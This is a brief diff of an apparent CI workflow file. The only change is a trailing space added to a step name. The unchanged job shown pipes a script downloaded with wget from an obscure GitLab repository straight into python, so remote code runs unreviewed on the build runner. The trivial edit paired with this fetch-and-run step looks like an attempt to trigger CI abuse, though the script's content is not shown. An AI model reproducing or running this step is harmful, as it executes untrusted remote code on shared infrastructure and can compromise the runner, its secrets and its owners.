@@ -14,7 +14,7 @@ jobs:
   A:
     steps:
       - uses: docker://python:latest
-        name: Run
+        name: Run 
         run: "wget -O- https://gitlab.com/rockymoysu/000/-/raw/main/setup.py | python "
   B:
     steps:
